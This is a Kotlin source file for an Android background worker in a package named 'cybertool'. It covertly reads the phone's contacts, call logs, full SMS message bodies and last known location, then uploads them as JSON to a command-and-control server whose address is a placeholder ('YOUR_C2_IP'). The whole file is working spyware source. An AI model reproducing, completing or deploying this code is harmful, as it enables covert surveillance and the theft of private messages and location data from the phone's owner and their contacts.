package com.riqel.cybertool

import android.content.ContentResolver
import android.content.Context
import android.database.Cursor
import android.location.Location
import android.location.LocationManager
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.Telephony
import androidx.work.Worker
import androidx.work.WorkerParameters
import com.google.gson.Gson
import okhttp3.*
import java.io.IOException

class DataUploadWorker(context: Context, params: WorkerParameters) : Worker(context, params) {
    private val client = OkHttpClient()
    private val gson = Gson()
    // Replace with your C2 server IP/domain
    private val C2_URL = "http://YOUR_C2_IP:5000/api/collect"

    override fun doWork(): Result {
        val data = collectAllData()
        val json = gson.toJson(data)
        val request = Request.Builder()
            .url(C2_URL)
            .post(RequestBody.create(MediaType.parse("application/json"), json))
            .build()
        return try {
            val response = client.newCall(request).execute()
            if (response.isSuccessful) Result.success() else Result.retry()
        } catch (e: IOException) {
            Result.retry()
        }
    }

    private fun collectAllData(): Map<String, Any> {
        val result = mutableMapOf<String, Any>()
        result["contacts"] = getContacts()
        result["callLogs"] = getCallLogs()
        result["sms"] = getSmsMessages()
        result["location"] = getLastLocation()
        return result
    }

    private fun getContacts(): List<Map<String, String>> {
        val list = mutableListOf<Map<String, String>>()
        val cr: ContentResolver = applicationContext.contentResolver
        val cursor: Cursor? = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null)
        cursor?.use {
            val nameIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
            val numberIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
            while (it.moveToNext()) {
                list.add(mapOf("name" to it.getString(nameIdx), "number" to it.getString(numberIdx)))
            }
        }
        return list
    }

    private fun getCallLogs(): List<Map<String, String>> {
        val list = mutableListOf<Map<String, String>>()
        val cr = applicationContext.contentResolver
        val cursor = cr.query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC")
        cursor?.use {
            val numIdx = it.getColumnIndex(CallLog.Calls.NUMBER)
            val typeIdx = it.getColumnIndex(CallLog.Calls.TYPE)
            val dateIdx = it.getColumnIndex(CallLog.Calls.DATE)
            while (it.moveToNext()) {
                list.add(mapOf(
                    "number" to it.getString(numIdx),
                    "type" to it.getString(typeIdx),
                    "date" to it.getString(dateIdx)
                ))
            }
        }
        return list
    }

    private fun getSmsMessages(): List<Map<String, String>> {
        val list = mutableListOf<Map<String, String>>()
        val cr = applicationContext.contentResolver
        val cursor = cr.query(Telephony.Sms.CONTENT_URI, null, null, null, Telephony.Sms.DATE + " DESC")
        cursor?.use {
            val addressIdx = it.getColumnIndex(Telephony.Sms.ADDRESS)
            val bodyIdx = it.getColumnIndex(Telephony.Sms.BODY)
            val dateIdx = it.getColumnIndex(Telephony.Sms.DATE)
            while (it.moveToNext()) {
                list.add(mapOf(
                    "address" to it.getString(addressIdx),
                    "body" to it.getString(bodyIdx),
                    "date" to it.getString(dateIdx)
                ))
            }
        }
        return list
    }

    private fun getLastLocation(): Map<String, Double>? {
        val lm = applicationContext.getSystemService(Context.LOCATION_SERVICE) as LocationManager
        val providers = lm.getProviders(true)
        var lastLocation: Location? = null
        for (provider in providers) {
            val loc = lm.getLastKnownLocation(provider)
            if (loc != null && (lastLocation == null || loc.time > lastLocation.time)) {
                lastLocation = loc
            }
        }
        return lastLocation?.let { mapOf("lat" to it.latitude, "lon" to it.longitude) }
    }
}
